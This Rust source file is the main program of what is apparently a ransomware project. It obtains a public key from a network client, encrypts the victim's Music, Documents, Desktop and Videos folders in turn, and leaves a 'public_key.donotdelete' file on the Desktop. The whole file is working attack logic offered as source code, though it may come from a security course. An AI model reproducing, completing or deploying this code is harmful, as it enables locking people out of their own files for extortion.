use std::path::PathBuf;
use std::fs;

use anyhow::Result;

use c_monster_co_2ic80::cryptography::encrypt::encrypt_folder;
use c_monster_co_2ic80::networking::client::gen_key;

use sodiumoxide::crypto::box_::{PublicKey};

use windows::{
    core::PWSTR,
    Win32::{
        UI::Shell::{SHGetKnownFolderPath, FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos, KNOWN_FOLDER_FLAG},
        System::Com::{CoInitializeEx, CoTaskMemFree, COINIT_MULTITHREADED},
    },
};

fn desktop_file_path(filename: &str) -> Result<PathBuf> {
    unsafe {
        let path: PWSTR = SHGetKnownFolderPath(&FOLDERID_Desktop, KNOWN_FOLDER_FLAG(0), None)?;
        let desktop = path.to_string()?;
        CoTaskMemFree(Some(path.0 as _));

        let desktop = path.to_string().unwrap();
        Ok(PathBuf::from(desktop).join(filename))
    }
}

// ENCRYPTING
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    sodiumoxide::init().unwrap();

    let pk: PublicKey = gen_key().await?;

    let paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];

    unsafe {
        for path in paths {
            let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
            let path_str = path_ptr.to_string().unwrap();
            let path_buf: PathBuf = path_str.into();
            println!("path: {:?}", path_buf);


            match encrypt_folder(&path_buf, &pk) {
                Ok(_) => println!("✓ Successfully encrypted: {:?}", path),
                Err(e) => println!("✗ Error encrypting {:?}: {}", path, e),
            }

            let out_path = desktop_file_path("public_key.donotdelete")?;
            fs::write(out_path, &pk)?;
        }
    }

    Ok(())
}
